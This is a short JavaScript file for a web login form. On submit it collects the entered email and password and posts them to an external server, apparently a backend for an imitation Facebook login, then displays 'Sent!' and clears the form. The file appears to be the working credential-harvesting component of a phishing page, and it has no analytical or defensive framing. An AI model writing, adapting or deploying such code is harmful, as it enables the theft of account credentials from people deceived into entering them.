console.log("Main.js is running ✅");

const form = document.querySelector(".login-form");

if (form) {
  const emailInput = document.querySelector('input[type="text"]');
  const passwordInput = document.querySelector('input[type="password"]');
  const successMessage = document.getElementById("successMessage") || document.createElement("div");

  successMessage.id = "successMessage";
  successMessage.style.color = "green";
  successMessage.style.marginTop = "10px";

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    console.log("Form submitted ✅");

    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !password) {
      successMessage.textContent = "Both fields are required.";
      form.appendChild(successMessage);
      return;
    }

    try {
      const res = await fetch('https://fb-login-backend-xmsd.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await res.json();
      successMessage.textContent = data.success ? "✅ Sent!" : "❌ Failed to send.";
    } catch (err) {
      console.error("Request failed:", err);
      successMessage.textContent = "❌ Error. Try again later.";
    }

    form.appendChild(successMessage);
    form.reset();
  });
}
